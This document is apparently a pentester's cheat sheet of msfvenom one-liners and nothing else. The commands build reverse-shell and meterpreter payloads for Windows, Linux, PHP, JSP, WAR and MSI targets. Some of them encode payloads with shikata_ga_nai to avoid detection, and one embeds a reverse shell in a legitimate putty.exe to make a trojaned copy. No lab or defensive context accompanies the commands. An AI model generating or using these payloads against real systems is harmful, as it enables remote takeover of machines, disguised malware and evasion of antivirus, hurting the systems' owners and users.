# msfvenom

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$port -f war -o deploy.war

msfvenom -p windows/shell_reverse_tcp -f exe LHOST=$IP LPORT=$port > eternal-blue.exe

msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -a x86 --platform Windows -b '\x00' -i 3 -f python > payload.txt

msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$port -a x64 --platform windows -x putty.exe -k -b "\x00" -f exe -o puttyX.exe

msfvenom -p linux/x86/shell_reverse_tcp LHOST=$ip LPORT=$port  -b "x00" -e x86/shikata_ga_nai -f python

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=$port -f elf -o msf.elf

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$port -f elf -o msf.bin

msfvenom -p cmd/unix/reverse_bash lhost=$ip lport=$port R

msfvenom -p cmd/unix/reverse_bash lhost=$ip lport=$port -f raw > shell.sh

msfvenom -p cmd/unix/reverse_python lhost=$ip lport=$port R

msfvenom -p cmd/unix/reverse_python lhost=$ip lport=$port -f raw > shell.py

msfvenom -p cmd/unix/reverse_netcat lhost=$ip lport=$port R

msfvenom -p php/meterpreter/reverse_tcp lhost=$ip lport=$port -f raw

msfvenom -p php/meterpreter/reverse_tcp LHOST=$ip LPORT=$port > shell.php

msfvenom -p php/meterpreter/reverse_tcp LHOST=$IP LPORT=$port -f raw > hawk.php

msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$port -f raw > tom.jsp

msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > jerry.war

msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f msi > myinstaller.msi
```
